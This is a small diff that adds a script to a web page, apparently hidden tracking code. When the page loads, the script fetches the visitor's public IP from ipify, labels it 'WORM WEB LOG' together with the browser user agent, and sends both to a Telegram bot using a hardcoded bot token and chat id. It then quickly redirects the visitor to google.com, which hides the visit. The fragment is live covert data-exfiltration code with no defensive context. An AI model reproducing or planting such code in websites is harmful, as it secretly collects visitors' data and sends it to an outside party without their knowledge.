@@ -1,0 +1,8 @@
+ fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const msg = "WORM WEB LOG\nIP: " + data.ip + "\nUA: " + navigator.userAgent;
+        fetch("https://api.telegram.org/bot8536635132:AAEgtLwL1QQIe0g1VolOW6ts510DtscfKv4/sendMessage?chat_id=8053770740&text=" + encodeURIComponent(msg));
+        setTimeout(() => { window.location.href = "https://google.com"; }, 500);
+      });
+</script>
